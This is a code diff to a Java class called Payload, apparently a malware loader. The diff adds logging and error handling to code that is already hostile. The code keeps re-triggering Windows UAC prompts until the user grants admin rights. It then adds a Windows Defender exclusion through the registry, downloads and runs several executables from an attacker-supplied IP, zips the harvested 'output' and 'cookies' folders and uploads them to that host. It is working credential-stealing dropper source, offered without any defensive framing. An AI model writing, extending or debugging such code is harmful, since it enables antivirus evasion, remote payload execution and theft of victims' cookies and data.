@@ -14,16 +14,40 @@ public class Payload {
     }
 
     public static void main(String[] args) {
-        if (args.length < 2) return;
-        
-        String accountKey = args[0];
-        String serverIp = args[1];
+        try {
+            log("--- STARTING ST.JAR ---");
+            if (args.length < 2) {
+                log("Missing arguments. Exiting.");
+                return;
+            }
+            
+            String accountKey = args[0];
+            String serverIp = args[1];
+            log("Key: " + accountKey + " | IP: " + serverIp);
 
-        if (!isAdmin()) {
-            uacLoop(accountKey, serverIp);
-        } else {
-            executePayload(accountKey, serverIp);
+            if (!isAdmin()) {
+                log("Not admin. Starting UAC loop...");
+                uacLoop(accountKey, serverIp);
+            } else {
+                log("We are Admin! Proceeding.");
+                executePayload(accountKey, serverIp);
+            }
+        } catch (Throwable t) {
+            log("FATAL ERROR: " + t.toString());
+            StringWriter sw = new StringWriter();
+            t.printStackTrace(new PrintWriter(sw));
+            log(sw.toString());
         }
+    }
+
+    private static void log(String msg) {
+        try {
+            String appData = System.getenv("APPDATA");
+            File logFile = new File(appData + "\\loader\\java_debug.txt");
+            FileWriter fw = new FileWriter(logFile, true);
+            fw.write(msg + "\n");
+            fw.close();
+        } catch (Exception e) {}
     }
 
     private static boolean isAdmin() {
@@ -37,55 +61,77 @@ public class Payload {
         String javaw = System.getProperty("java.home") + "\\bin\\javaw.exe";
         String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getAbsolutePath();
         
+        // Fix URL encoding issues with spaces in the path
+        jarPath = jarPath.replace("%20", " ");
+        
         while (true) {
-            // Call ShellExecuteW directly to trigger UAC
-            int result = Shell32.INSTANCE.ShellExecuteW(
-                null, "runas", javaw, "-jar \"" + jarPath + "\" " + key + " " + ip, null, 0
-            );
+            log("Triggering UAC...");
+            try {
+                int result = Shell32.INSTANCE.ShellExecuteW(
+                    null, "runas", javaw, "-jar \"" + jarPath + "\" " + key + " " + ip, null, 0
+                );
 
-            if (result > 32) {
-                System.exit(0); // Admin accepted, kill parent loop
+                if (result > 32) {
+                    log("UAC Accepted. Parent exiting.");
+                    System.exit(0); 
+                } else {
+                    log("UAC Denied (Code: " + result + "). Retrying...");
+                }
+            } catch (Exception e) {
+                log("UAC Loop Error: " + e.toString());
             }
-            try { Thread.sleep(100); } catch (Exception e) {}
+            try { Thread.sleep(500); } catch (Exception e) {}
         }
     }
 
     private static void executePayload(String key, String ip) {
         try {
+            log("Executing payload...");
             String appData = System.getenv("APPDATA");
             File loaderDir = new File(appData, "loader");
             if (!loaderDir.exists()) loaderDir.mkdirs();
 
-            // 1. Add AV Exclusion dynamically
+            // 1. Add AV Exclusion
+            log("Adding AV exclusion...");
             String regPath = "HKLM\\" + "SOFTWARE\\" + "Microsoft\\" + "\\Windows " + "Defender\\Exclusions\\Paths";
             String cmd = "reg add \"" + regPath + "\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f";
             Runtime.getRuntime().exec(cmd).waitFor();
             
             // 2. Download EXEs
+            log("Downloading payloads...");
             String[] files = {"1.exe", "2.exe", "3.exe", "crmodule.dll"};
             for (String file : files) {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
             // 3. Execute
+            log("Executing 3.exe...");
             ProcessBuilder pb = new ProcessBuilder(new File(loaderDir, "3.exe").getAbsolutePath());
             pb.start();
             
+            log("Executing 2.exe...");
             pb = new ProcessBuilder(new File(loaderDir, "2.exe").getAbsolutePath(), "all");
             pb.start();
             
             Thread.sleep(2000);
             
+            log("Executing 1.exe...");
             pb = new ProcessBuilder(new File(loaderDir, "1.exe").getAbsolutePath());
             pb.start();
 
             // 4. Harvest & Upload
+            log("Waiting for harvest...");
             Thread.sleep(25000);
             File zipFile = new File(loaderDir, "capture.zip");
             zipFolders(new String[]{"output", "cookies"}, zipFile);
+            
+            log("Uploading capture.zip...");
             uploadFile("http://" + ip + "/api/rpc", zipFile, key);
+            log("Done!");
 
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            log("Execute Error: " + e.toString());
+        }
     }
 
     private static void downloadFile(String urlStr, File dest) {
@@ -98,7 +144,9 @@ public class Payload {
                 int len;
                 while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            log("Download failed for " + urlStr + ": " + e.toString());
+        }
     }
 
     private static void zipFolders(String[] folders, File zipFile) {
@@ -114,7 +162,9 @@ public class Payload {
                     }
                 }
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            log("Zip failed: " + e.toString());
+        }
     }
 
     private static void uploadFile(String urlStr, File file, String key) {
@@ -132,6 +182,8 @@ public class Payload {
                 os.write(json.getBytes());
             }
             conn.getResponseCode();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            log("Upload failed: " + e.toString());
+        }
     }
 }
